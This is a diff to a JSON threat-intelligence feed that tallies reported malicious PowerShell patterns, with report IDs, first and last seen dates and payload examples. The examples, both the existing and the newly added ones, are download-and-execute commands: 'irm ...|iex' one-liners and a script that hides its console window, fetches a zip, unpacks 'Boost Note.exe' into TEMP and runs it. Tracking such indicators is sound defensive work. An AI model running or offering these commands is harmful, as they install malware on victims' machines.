@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 146,
-    "ReportCount": 146,
+    "DistinctPayloadCount": 147,
+    "ReportCount": 147,
     "FirstSeen": "2026-11-14T23:14:54.846000+00:00",
-    "LastSeen": "2026-11-21T12:30:27.952000+00:00",
+    "LastSeen": "2026-11-21T18:26:04.212000+00:00",
     "ReportIds": [
       "cmwh0wou40mte0omlvnsta2vn",
       "cmwh1uj7x0n750omlble342fr",
@@ -151,7 +151,8 @@
       "cmwojjhkd1zzs0omlsqk31zh4",
       "cmwpthx4023zn0omleyj7lhjr",
       "cmwq3hj6925o90omluxfpwhhb",
-      "cmwqdyvxc26l80omlqt7iyopg"
+      "cmwqdyvxc26l80omlqt7iyopg",
+      "cmwqqo73r28eh0omli28sjqkd"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/03b93fa50e7a9f43'|iex;",
@@ -299,7 +300,8 @@
       "irm 'img-codes-cloude[.]info/733cc39bf1b16194'|iex;",
       "irm 'img-codes-cloude[.]info/7b0251a9d1cd7f8c'|iex;",
       "irm 'img-codes-cloude[.]info/bdcfda63ea50bf2e'|iex;",
-      "irm 'img-codes-cloude[.]info/c0fdade6bf8b0ce9'|iex;"
+      "irm 'img-codes-cloude[.]info/c0fdade6bf8b0ce9'|iex;",
+      "irm 'img-codes-cloude[.]info/f4783b5bf31293eb'|iex;"
     ]
   },
   {
@@ -972,9 +974,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 11,
+    "ReportCount": 12,
     "FirstSeen": "2026-11-21T01:20:51.962000+00:00",
-    "LastSeen": "2026-11-21T18:07:09.543000+00:00",
+    "LastSeen": "2026-11-21T18:15:15.857000+00:00",
     "ReportIds": [
       "cmwpq1rz623xv0oml9b7ckyzg",
       "cmwpvtv3x24da0omlegqyi3w3",
@@ -986,7 +988,8 @@
       "cmwq3hc8s25mj0oml7jzq2r5l",
       "cmwqaak5m25zo0omla4vviesx",
       "cmwqh59zd26op0omlzr69fgi7",
-      "cmwqpzvm527qz0omlbakji56v"
+      "cmwqpzvm527qz0omlbakji56v",
+      "cmwqqaax7281a0omlwpjbmm8f"
     ],
     "PayloadExamples": [
       "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
